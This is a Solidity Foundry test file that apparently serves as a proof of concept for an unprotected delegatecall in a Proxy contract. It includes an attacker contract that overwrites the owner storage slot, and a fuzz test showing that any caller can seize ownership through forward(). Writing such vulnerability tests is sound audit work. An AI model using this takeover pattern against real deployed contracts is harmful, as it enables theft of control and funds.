
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Proxy} from "../src/Proxy.sol";

// Malicious contract that will be used to take over ownership via delegatecall
contract MaliciousOwnerTakeover {
    // Storage slot 0 matches the Proxy's owner slot
    address owner;
    
    function takeOver() external {
        owner = msg.sender;
    }
}

contract TestAccessControlProxy is Test {
    Proxy public _contractUnderTest;
    MaliciousOwnerTakeover public _maliciousContract;
    address public originalOwner;

    function setUp() public {
        originalOwner = address(this);
        _contractUnderTest = new Proxy();
        _maliciousContract = new MaliciousOwnerTakeover();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));

        // Exclude Foundry Internals
        vm.assume(caller != address(vm)); 
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the original owner (the deployer/test contract)
        vm.assume(caller != originalOwner);

        // --- 2. State Configuration ---
        // No special funding needed for this test

        // --- 3. Execution & Assertion ---
        
        // Verify the original owner before the attack
        bytes32 ownerSlot = vm.load(address(_contractUnderTest), bytes32(uint256(0)));
        address ownerBefore = address(uint160(uint256(ownerSlot)));
        assertEq(ownerBefore, originalOwner, "Owner should be original owner before attack");

        // Switch context to the arbitrary caller
        vm.prank(caller);

        // Prepare the malicious calldata - this will call takeOver() via delegatecall
        // which will overwrite the owner storage slot in the Proxy contract
        bytes memory maliciousData = abi.encodeWithSignature("takeOver()");

        // TRIGGER VULNERABILITY: Arbitrary user can call forward() with any callee and data
        // This allows them to execute arbitrary code in the context of the Proxy
        _contractUnderTest.forward(address(_maliciousContract), maliciousData);

        // ASSERT SUCCESS: Verify the owner has been changed to the attacker
        bytes32 ownerSlotAfter = vm.load(address(_contractUnderTest), bytes32(uint256(0)));
        address ownerAfter = address(uint160(uint256(ownerSlotAfter)));
        
        // The vulnerability is proven if the arbitrary caller successfully changed the owner
        assertEq(ownerAfter, caller, "Arbitrary caller should have taken over ownership");
        assertTrue(ownerAfter != originalOwner, "Owner should no longer be the original owner");
    }
}
